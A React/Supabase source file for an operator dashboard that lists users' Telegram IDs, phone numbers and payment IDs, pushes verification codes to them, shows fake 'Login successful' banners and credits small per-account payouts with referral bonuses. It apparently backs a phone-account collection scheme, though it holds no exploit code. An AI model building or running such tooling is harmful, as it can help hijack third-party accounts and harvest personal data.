import React, { useState, useEffect, useMemo } from 'react';
import { useAppConfig } from '../context/AppContext';
import { supabase, SupabaseTask } from '../lib/supabase';
import { User, Phone, Globe, Hash, Clock, Check, Edit2, Image as ImageIcon, Search, ShieldCheck, Activity, Users, FileText, Send, CheckCircle2, MessageSquare } from 'lucide-react';

export default function AdminDashboard() {
  const [tasks, setTasks] = useState<SupabaseTask[]>([]);
  const [editingId, setEditingId] = useState<string | null>(null);
  const [searchQuery, setSearchQuery] = useState('');
  const [filter, setFilter] = useState<'all' | 'waiting' | 'success'>('all');
  const [notification, setNotification] = useState<string | null>(null);

  const showNotification = (msg: string) => {
    setNotification(msg);
    setTimeout(() => setNotification(null), 3000);
  };

  // Fetch and subscribe to Supabase
  useEffect(() => {
    const fetchTasks = async () => {
      const { data, error } = await supabase
        .from('verifications')
        .select('*')
        .order('created_at', { ascending: false });
        
      if (error) {
        console.error('Supabase fetch error:', error);
        showNotification(`Error loading data: ${error.message} (Is RLS enabled?)`);
      } else if (data) {
        setTasks(data as SupabaseTask[]);
      }
    };

    fetchTasks();

    // Subscribe to any changes on the verifications table
    const channel = supabase
      .channel('admin-db-changes')
      .on(
        'postgres_changes',
        { event: '*', schema: 'public', table: 'verifications' },
        (payload) => {
          if (payload.eventType === 'INSERT') {
            setTasks((prev) => [payload.new as SupabaseTask, ...prev]);
          } else if (payload.eventType === 'UPDATE') {
            setTasks((prev) => prev.map(t => t.id === payload.new.id ? payload.new as SupabaseTask : t));
          } else if (payload.eventType === 'DELETE') {
            setTasks((prev) => prev.filter(t => t.id !== payload.old.id));
          }
        }
      )
      .subscribe();

    return () => {
      supabase.removeChannel(channel);
    };
  }, []);

  const [customDefaultCode, setCustomDefaultCode] = useState('7777-3333');
  const [showSettings, setShowSettings] = useState(false);

  useEffect(() => {
    const savedCode = localStorage.getItem('admin_default_verification_code');
    if (savedCode) {
      setCustomDefaultCode(savedCode);
    }
  }, []);

  const handleSaveSettings = () => {
    localStorage.setItem('admin_default_verification_code', customDefaultCode);
    setShowSettings(false);
    showNotification('Settings saved!');
  };

  const handleSendCode = async (id: string, telegram_id: number) => {
    await supabase.from('verifications').update({ verification_code: customDefaultCode }).eq('id', id);
    showNotification(`Code ${customDefaultCode} has been sent!`);
  };

  const handleSendBanner = async (id: string, type: 'success' | 'error') => {
    // Check current task data
    const task = tasks.find(t => t.id === id);
    if (!task) return;

    // Generates the green "Login successful" banner similar to your image
    const SUCCESS_BANNER_URL = "data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20width%3D%22500%22%20height%3D%22120%22%20viewBox%3D%220%200%20500%20120%22%3E%3Crect%20width%3D%22100%25%22%20height%3D%22100%25%22%20fill%3D%22%2358c026%22%2F%3E%3Cg%20transform%3D%22translate(30%2C%2020)%22%3E%3Cpath%20d%3D%22M12%2C14%20L82%2C14%20C89%2C14%2093%2C19%2091%2C26%20L81%2C72%20C79%2C79%2073%2C83%2066%2C83%20L10%2C83%20C3%2C83%20-1%2C78%200%2C71%20L7%2C24%20C8%2C18%2011%2C14%2018%2C14%20Z%22%20fill%3D%22%23fff%22%2F%3E%3Cpath%20d%3D%22M12%2C24%20L45%2C46%20L82%2C24%22%20stroke%3D%22%2358c026%22%20stroke-width%3D%225%22%20fill%3D%22none%22%20stroke-linecap%3D%22round%22%20stroke-linejoin%3D%22round%22%2F%3E%3Cline%20x1%3D%22-15%22%20y1%3D%2230%22%20x2%3D%220%22%20y2%3D%2230%22%20stroke%3D%22%23fff%22%20stroke-width%3D%224%22%20stroke-linecap%3D%22round%22%2F%3E%3Cline%20x1%3D%22-25%22%20y1%3D%2250%22%20x2%3D%225%22%20y2%3D%2250%22%20stroke%3D%22%23fff%22%20stroke-width%3D%224%22%20stroke-linecap%3D%22round%22%2F%3E%3Cline%20x1%3D%22-10%22%20y1%3D%2270%22%20x2%3D%22-2%22%20y2%3D%2270%22%20stroke%3D%22%23fff%22%20stroke-width%3D%224%22%20stroke-linecap%3D%22round%22%2F%3E%3C%2Fg%3E%3Ctext%20x%3D%22140%22%20y%3D%2255%22%20font-family%3D%22Arial%2C%20Helvetica%2C%20sans-serif%22%20font-weight%3D%22bold%22%20font-size%3D%2228%22%20fill%3D%22%23fff%22%3ELogin%20successful%2C%3C%2Ftext%3E%3Ctext%20x%3D%22140%22%20y%3D%2290%22%20font-family%3D%22Arial%2C%20Helvetica%2C%20sans-serif%22%20font-weight%3D%22bold%22%20font-size%3D%2228%22%20fill%3D%22%23fff%22%3Ecurrently%20sending%3C%2Ftext%3E%3C%2Fsvg%3E";
    // Generates a red "Login failed" banner
    const ERROR_BANNER_URL = "data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20width%3D%22500%22%20height%3D%22120%22%20viewBox%3D%220%200%20500%20120%22%3E%3Crect%20width%3D%22100%25%22%20height%3D%22100%25%22%20fill%3D%22%23d32f2f%22%2F%3E%3Cg%20transform%3D%22translate(30%2C%2020)%22%3E%3Cpath%20d%3D%22M45%2C10%20A35%2C35%200%201%2C0%2045%2C80%20A35%2C35%200%201%2C0%2045%2C10%20Z%22%20fill%3D%22none%22%20stroke%3D%22%23fff%22%20stroke-width%3D%228%22%2F%3E%3Cpath%20d%3D%22M30%2C30%20L60%2C60%20M60%2C30%20L30%2C60%22%20stroke%3D%22%23fff%22%20stroke-width%3D%228%22%20stroke-linecap%3D%22round%22%2F%3E%3C%2Fg%3E%3Ctext%20x%3D%22120%22%20y%3D%2255%22%20font-family%3D%22Arial%2C%20Helvetica%2C%20sans-serif%22%20font-weight%3D%22bold%22%20font-size%3D%2228%22%20fill%3D%22%23fff%22%3ELogin%20failed%2C%3C%2Ftext%3E%3Ctext%20x%3D%22120%22%20y%3D%2290%22%20font-family%3D%22Arial%2C%20Helvetica%2C%20sans-serif%22%20font-weight%3D%22bold%22%20font-size%3D%2228%22%20fill%3D%22%23fff%22%3Eplease%20try%20again%3C%2Ftext%3E%3C%2Fsvg%3E";

    const imageUrl = type === 'success' ? SUCCESS_BANNER_URL : ERROR_BANNER_URL;
    const msg = type === 'success' ? 'The admin has successfully verified your data. (Verified)' : 'Verification failed, please review and try again.';
    
    let newBalance = task.balance || 0;
    // Only add balance if status is changing to success and they didn't already have it (prevent duplicate credits)
    if (type === 'success' && task.status !== 'success') {
      newBalance += 0.05;

      // Credit referrer if they have one
      if (task.referred_by) {
        // Fetch referrer
        const { data: referrerData } = await supabase
          .from('verifications')
          .select('id, balance')
          .eq('telegram_id', task.referred_by)
          .single();
        
        if (referrerData) {
          await supabase.from('verifications')
            .update({ balance: (referrerData.balance || 0) + 0.005 })
            .eq('id', referrerData.id);
        }
      }
    }

    await supabase.from('verifications').update({ 
      image_url: imageUrl,
      success_message: msg,
      status: type === 'success' ? 'success' : 'error',
      balance: newBalance
    }).eq('id', id);

    showNotification(type === 'success' ? 'Success Banner sent to user & $0.05 credited!' : 'Error Banner sent to user!');
  };

  const handleSendSuccess = async (id: string, telegram_id: number) => {
    await supabase.from('verifications').update({ 
      status: 'success', 
      success_message: 'The admin has successfully verified your data. (Verified)' 
    }).eq('id', id);
    showNotification('Verification approval sent!');
  };

  const handleCustomCodeChangeLocally = (id: string, code: string) => {
    setTasks((prev) => prev.map(t => t.id === id ? { ...t, verification_code: code } : t));
  };

  const handleCustomCodeSave = async (id: string, code: string) => {
    await supabase.from('verifications').update({ verification_code: code }).eq('id', id);
    showNotification('The custom code has been sent!');
  };

  const handleExportCSV = () => {
    const headers = ['ID', 'Telegram ID', 'Phone', 'Country', 'Account Type', 'Status', 'Date'];
    const csvContent = [
      headers.join(','),
      ...filteredTasks.map(t => [
        t.id,
        t.telegram_id,
        t.phone,
        t.country ? `"${t.country}"` : '',
        t.account_type,
        t.status,
        new Date(t.created_at).toLocaleString()
      ].join(','))
    ].join('\n');

    const blob = new Blob([csvContent], { type: 'text/csv;charset=utf-8;' });
    const link = document.createElement('a');
    link.href = URL.createObjectURL(blob);
    link.setAttribute('download', `verification_data_${new Date().toISOString().split('T')[0]}.csv`);
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
    showNotification('Data successfully exported (CSV)');
  };

  // Compute filtered tasks
  const filteredTasks = useMemo(() => {
    return tasks.filter(t => {
      const tgIdStr = String(t.telegram_id);
      const matchesSearch = tgIdStr.includes(searchQuery) || (t.phone && t.phone.includes(searchQuery)) || (t.country && t.country.toLowerCase().includes(searchQuery.toLowerCase()));
      const matchesFilter = filter === 'all' || t.status === filter;
      return matchesSearch && matchesFilter;
    });
  }, [tasks, searchQuery, filter]);

  // Compute stats
  const stats = {
    total: tasks.length,
    pending: tasks.filter(t => t.status === 'waiting').length,
    success: tasks.filter(t => t.status === 'success').length,
  };

  return (
    <div className="p-4 md:p-8 max-w-6xl mx-auto space-y-8 pb-20">
      {/* Header */}
      <div className="flex flex-col md:flex-row md:items-end justify-between gap-4 border-b border-zinc-800 pb-6">
        <div>
          <div className="flex items-center gap-2 mb-2">
            <ShieldCheck className="w-6 h-6 text-emerald-500" />
            <h2 className="text-2xl font-bold text-zinc-100 tracking-tight">Admin Secure Node</h2>
          </div>
          <p className="text-sm text-zinc-400">Control Center & User Verification Management</p>
        </div>
        <div className="flex items-center gap-3">
          <div className="flex items-center px-3 py-1.5 bg-zinc-900 border border-zinc-800 rounded-lg text-xs font-mono text-zinc-400">
            <Activity className="w-3.5 h-3.5 text-emerald-500 mr-2 animate-pulse" />
            System Live
          </div>
        </div>
      </div>

      {/* Stats Cards */}
      <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
        <div className="bg-zinc-900 border border-zinc-800 rounded-xl p-5 flex items-center justify-between">
          <div>
            <p className="text-xs font-bold text-zinc-500 uppercase tracking-widest mb-1">Total Users</p>
            <p className="text-3xl font-bold text-zinc-100">{stats.total}</p>
          </div>
          <div className="w-12 h-12 rounded-full bg-zinc-800/50 flex items-center justify-center">
            <Users className="w-6 h-6 text-zinc-400" />
          </div>
        </div>
        <div className="bg-zinc-900 border border-zinc-800 rounded-xl p-5 flex items-center justify-between">
          <div>
            <p className="text-xs font-bold text-amber-500/80 uppercase tracking-widest mb-1">Pending Tasks</p>
            <p className="text-3xl font-bold text-amber-500">{stats.pending}</p>
          </div>
          <div className="w-12 h-12 rounded-full bg-amber-500/10 flex items-center justify-center">
            <FileText className="w-6 h-6 text-amber-500" />
          </div>
        </div>
        <div className="bg-zinc-900 border border-zinc-800 rounded-xl p-5 flex items-center justify-between">
          <div>
            <p className="text-xs font-bold text-emerald-500/80 uppercase tracking-widest mb-1">Verified</p>
            <p className="text-3xl font-bold text-emerald-500">{stats.success}</p>
          </div>
          <div className="w-12 h-12 rounded-full bg-emerald-500/10 flex items-center justify-center">
            <Check className="w-6 h-6 text-emerald-500" />
          </div>
        </div>
      </div>

      {/* Toolbar */}
      <div className="flex flex-col sm:flex-row gap-4 items-center justify-between bg-zinc-900 p-2 rounded-xl border border-zinc-800">
        <div className="relative w-full sm:w-96">
          <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-zinc-500" />
          <input 
            type="text" 
            placeholder="Search ID, phone, or country..." 
            value={searchQuery}
            onChange={e => setSearchQuery(e.target.value)}
            className="w-full bg-zinc-950 border-none outline-none text-sm text-zinc-200 placeholder-zinc-600 rounded-lg pl-10 pr-4 py-2.5 focus:ring-1 focus:ring-emerald-500 transition-shadow"
          />
        </div>
        <div className="flex w-full sm:w-auto items-center space-x-2">
          <div className="flex w-full sm:w-auto p-1 bg-zinc-950 rounded-lg">
            <button 
              onClick={() => setFilter('all')}
              className={`flex-1 sm:flex-none px-4 py-1.5 text-xs font-bold rounded-md transition-colors ${filter === 'all' ? 'bg-zinc-800 text-zinc-100' : 'text-zinc-500 hover:text-zinc-300'}`}
            >
              All
            </button>
            <button 
              onClick={() => setFilter('waiting')}
              className={`flex-1 sm:flex-none px-4 py-1.5 text-xs font-bold rounded-md transition-colors ${filter === 'waiting' ? 'bg-zinc-800 text-amber-400' : 'text-zinc-500 hover:text-zinc-300'}`}
            >
              Pending
            </button>
            <button 
              onClick={() => setFilter('success')}
              className={`flex-1 sm:flex-none px-4 py-1.5 text-xs font-bold rounded-md transition-colors ${filter === 'success' ? 'bg-zinc-800 text-emerald-400' : 'text-zinc-500 hover:text-zinc-300'}`}
            >
              Success
            </button>
          </div>
          <button 
            onClick={handleExportCSV}
            className="flex items-center px-4 py-2 bg-emerald-600/20 text-emerald-500 hover:bg-emerald-600 hover:text-white rounded-lg text-xs font-bold transition-all whitespace-nowrap"
            title="Download CSV"
          >
            Export
          </button>
          <button 
            onClick={() => setShowSettings(true)}
            className="flex items-center px-4 py-2 bg-indigo-600/20 text-indigo-400 hover:bg-indigo-600 hover:text-white rounded-lg text-xs font-bold transition-all whitespace-nowrap"
            title="Settings"
          >
            Settings
          </button>
        </div>
      </div>

      {filteredTasks.length === 0 ? (
        <div className="text-center bg-zinc-900 rounded-2xl py-16 border border-zinc-800 border-dashed">
          <Search className="w-10 h-10 text-zinc-700 mx-auto mb-3" />
          <h3 className="text-lg font-bold text-zinc-300">No results found</h3>
          <p className="text-zinc-600 mt-1 text-sm">There are no tasks matching your query.</p>
        </div>
      ) : (
        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
          {filteredTasks.map(task => (
            <div key={task.id} className="bg-zinc-900 rounded-2xl border border-zinc-800 overflow-hidden flex flex-col group hover:border-zinc-700 transition-colors">
              {/* Card Header */}
              <div className="p-4 border-b border-zinc-800/50 flex justify-between items-center bg-zinc-900/50">
                <div className="flex items-center space-x-3">
                  <div className="w-8 h-8 rounded-full bg-zinc-800 flex items-center justify-center border border-zinc-700">
                    <User className="w-4 h-4 text-zinc-400" />
                  </div>
                  <div>
                    <span className="font-mono text-xs font-bold text-zinc-300 bg-zinc-950 px-2 py-0.5 rounded border border-zinc-800">
                      ID: {task.telegram_id}
                    </span>
                  </div>
                </div>
                <StatusBadge status={task.status} />
              </div>

              {/* Card Body */}
              <div className="p-5 space-y-4 flex-grow">
                {editingId === task.id ? (
                  <div className="space-y-3 bg-zinc-950 p-3 rounded-xl border border-zinc-800">
                    <input 
                      type="text" 
                      defaultValue={task.phone}
                      id={`edit-phone-${task.id}`}
                      className="w-full bg-zinc-900 border border-zinc-700 rounded-lg px-3 py-2 text-sm text-zinc-200 focus:border-emerald-500 outline-none"
                    />
                    <select 
                      defaultValue={task.account_type} 
                      id={`edit-type-${task.id}`}
                      className="w-full bg-zinc-900 border border-zinc-700 rounded-lg px-3 py-2 text-sm text-zinc-200 focus:border-emerald-500 outline-none"
                    >
                      <option value="Personal">Personal</option>
                      <option value="Business">Business</option>
                    </select>
                    <div className="flex gap-2 pt-1">
                      <button 
                        onClick={() => {
                          const phone = (document.getElementById(`edit-phone-${task.id}`) as HTMLInputElement).value;
                          const account_type = (document.getElementById(`edit-type-${task.id}`) as HTMLSelectElement).value as any;
                          supabase.from('verifications').update({ phone, account_type }).eq('id', task.id);
                          setEditingId(null);
                        }}
                        className="bg-emerald-600 hover:bg-emerald-500 text-white px-4 py-2 rounded-lg text-xs font-bold flex-1 transition-colors"
                      >
                        Save
                      </button>
                      <button 
                        onClick={() => setEditingId(null)}
                        className="bg-zinc-800 hover:bg-zinc-700 text-zinc-300 px-4 py-2 rounded-lg text-xs font-bold transition-colors"
                      >
                        Cancel
                      </button>
                    </div>
                  </div>
                ) : (
                  <>
                    <div className="flex flex-col gap-2">
                      <div className="flex items-center text-sm font-medium text-zinc-200">
                        <Phone className="w-4 h-4 text-zinc-500 mr-2" />
                        <span className="font-mono">{task.phone}</span>
                      </div>
                      <div className="flex items-center text-xs text-zinc-500">
                        <Globe className="w-3.5 h-3.5 text-zinc-600 mr-2" />
                        {task.country || 'Unknown location'}
                      </div>
                      {(task.payment_method || task.transaction_id) && (
                        <div className="bg-zinc-950 rounded-md p-2 mt-1 border border-zinc-800">
                          <div className="text-[10px] text-zinc-500 uppercase font-bold tracking-widest mb-1 flex items-center justify-between">
                            <span>{task.payment_method || 'Payment'}</span>
                            <span className="px-1.5 py-0.5 bg-emerald-500/10 text-emerald-400 rounded">Pending Verify</span>
                          </div>
                          <div className="flex items-center justify-between text-xs font-mono mb-1">
                            <span className="text-zinc-400">{task.payment_method === 'TRX' ? 'Hash:' : 'Operation ID:'}</span>
                            <span className="text-zinc-200 select-all font-bold">{task.transaction_id}</span>
                          </div>
                        </div>
                      )}
                      
                      <div className="flex items-center justify-between text-xs mt-2 bg-zinc-900 px-2 py-1.5 rounded border border-zinc-800">
                         <span className="text-zinc-400">Balance:</span>
                         <span className="text-emerald-400 font-bold">${(task.balance || 0).toFixed(3)}</span>
                      </div>
                      
                      {task.referred_by && (
                         <div className="flex items-center justify-between text-[10px] font-mono mt-1 text-zinc-500">
                            <span>Referred By:</span>
                            <span className="text-indigo-400">{task.referred_by}</span>
                         </div>
                      )}
                    </div>

                    <div className="flex items-center justify-between mt-4 pt-4 border-t border-zinc-800/50">
                      <span className={`px-2 py-1 rounded text-[10px] font-bold uppercase tracking-widest ${task.account_type === 'Business' ? 'bg-indigo-500/10 text-indigo-400 border border-indigo-500/20' : 'bg-zinc-800 text-zinc-400 border border-zinc-700'}`}>
                        {task.account_type}
                      </span>
                      <button
                        onClick={() => setEditingId(task.id)}
                        className="text-xs text-zinc-500 hover:text-zinc-300 font-bold flex items-center transition-colors"
                      >
                        <Edit2 className="w-3 h-3 mr-1" /> Edit
                      </button>
                    </div>
                  </>
                )}
              </div>

              {/* Admin Actions Panel */}
              <div className="p-4 bg-zinc-950 border-t border-zinc-800">
                <div className="flex flex-col gap-3">
                  <div className="flex flex-col gap-1.5">
                    <label className="text-[10px] uppercase tracking-widest font-bold text-zinc-600">Access Control</label>
                    <div className="flex gap-2">
                      <div className="relative flex-1">
                        <Hash className="w-3.5 h-3.5 text-zinc-600 absolute left-2.5 top-1/2 -translate-y-1/2" />
                        <input 
                          type="text" 
                          placeholder="Code" 
                          className="w-full bg-zinc-900 border border-zinc-800 rounded-lg pl-8 pr-10 py-1.5 text-sm font-mono tracking-widest text-emerald-400 focus:border-emerald-500 outline-none"
                          value={task.verification_code || ''}
                          onChange={(e) => handleCustomCodeChangeLocally(task.id, e.target.value)}
                        />
                        <button
                          onClick={() => handleCustomCodeSave(task.id, task.verification_code || '')}
                          className="absolute right-1 top-1/2 -translate-y-1/2 p-1.5 bg-emerald-600/20 text-emerald-500 hover:bg-emerald-500 hover:text-white rounded-md transition-colors"
                          title="Send Code"
                        >
                          <Send className="w-3.5 h-3.5" />
                        </button>
                      </div>
                      <button 
                        onClick={() => handleSendCode(task.id, task.telegram_id)}
                        className="px-3 py-1.5 bg-zinc-800 border border-zinc-700 text-zinc-300 rounded-lg text-xs font-bold hover:bg-zinc-700 transition-colors"
                        title={`Send Default Code: ${customDefaultCode}`}
                      >
                        Auto Code
                      </button>
                    </div>
                  </div>

                  <div className="flex gap-2">
                    <button 
                      onClick={() => handleSendBanner(task.id, 'success')}
                      className={`flex-1 flex items-center justify-center space-x-1.5 py-2 rounded-lg text-xs font-bold transition-colors bg-emerald-500/10 text-emerald-400 hover:bg-emerald-500/20 border border-emerald-500/20`}
                    >
                      <ImageIcon className="w-3.5 h-3.5" />
                      <span>{task.image_url?.includes('58c026') ? 'Banner Sent' : '✅ Success Banner'}</span>
                    </button>

                    <button 
                      onClick={() => handleSendBanner(task.id, 'error')}
                      className={`flex-1 flex items-center justify-center space-x-1.5 py-2 rounded-lg text-xs font-bold transition-colors bg-red-500/10 text-red-400 hover:bg-red-500/20 border border-red-500/20`}
                    >
                      <ImageIcon className="w-3.5 h-3.5" />
                      <span>{task.image_url?.includes('d32f2f') ? 'Banner Sent' : '❌ Error Banner'}</span>
                    </button>
                  </div>
                </div>
              </div>
            </div>
          ))}
        </div>
      )}
      {/* Notification Toast */}
      {notification && (
        <div className="fixed bottom-6 left-1/2 -translate-x-1/2 bg-emerald-600 text-white px-5 py-3 rounded-full shadow-lg shadow-emerald-900/50 flex items-center space-x-2 z-50 animate-in fade-in slide-in-from-bottom-5">
          <CheckCircle2 className="w-5 h-5" />
          <span className="text-sm font-bold tracking-wide">{notification}</span>
        </div>
      )}

      {/* Settings Modal */}
      {showSettings && (
        <div className="fixed inset-0 bg-black/60 backdrop-blur-sm z-50 flex items-center justify-center p-4">
          <div className="bg-zinc-900 border border-zinc-800 rounded-xl max-w-sm w-full p-6 shadow-2xl animate-in zoom-in-95">
            <h3 className="text-xl font-bold text-zinc-100 mb-4">Settings</h3>
            <div className="space-y-4">
              <div>
                <label className="block text-sm font-medium text-zinc-400 mb-1">Default Send Code</label>
                <input 
                  type="text" 
                  value={customDefaultCode}
                  onChange={e => setCustomDefaultCode(e.target.value)}
                  className="w-full bg-zinc-950 border border-zinc-800 outline-none text-zinc-200 rounded-lg px-3 py-2 focus:border-indigo-500 transition-colors"
                  placeholder="e.g. 7777-3333"
                />
                <p className="text-xs text-zinc-500 mt-2">This is the code that will be sent when you click the "Send Code" button on any user request.</p>
              </div>
              <div className="flex justify-end space-x-3 pt-2">
                <button 
                  onClick={() => setShowSettings(false)}
                  className="px-4 py-2 bg-zinc-800 hover:bg-zinc-700 text-zinc-300 rounded-lg text-sm font-bold transition-colors"
                >
                  Cancel
                </button>
                <button 
                  onClick={handleSaveSettings}
                  className="px-4 py-2 bg-indigo-600 hover:bg-indigo-500 text-white rounded-lg text-sm font-bold transition-colors"
                >
                  Save Changes
                </button>
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}

function StatusBadge({ status }: { status: string }) {
  if (status === 'waiting') {
    return (
      <div className="flex items-center gap-2 bg-amber-500/10 border border-amber-500/20 px-2 py-1 rounded-md">
        <div className="w-1.5 h-1.5 rounded-full bg-amber-500 animate-pulse"></div>
        <span className="text-[10px] uppercase tracking-widest font-bold text-amber-500">Pending</span>
      </div>
    );
  }
  if (status === 'success') {
    return (
      <div className="flex items-center gap-2 bg-emerald-500/10 border border-emerald-500/20 px-2 py-1 rounded-md">
        <div className="w-1.5 h-1.5 rounded-full bg-emerald-500"></div>
        <span className="text-[10px] uppercase tracking-widest font-bold text-emerald-500">Success</span>
      </div>
    );
  }
  return (
    <div className="flex items-center gap-2 bg-zinc-800 border border-zinc-700 px-2 py-1 rounded-md">
      <div className="w-1.5 h-1.5 rounded-full bg-zinc-500"></div>
      <span className="text-[10px] uppercase tracking-widest font-bold text-zinc-400 capitalize">{status}</span>
    </div>
  );
}
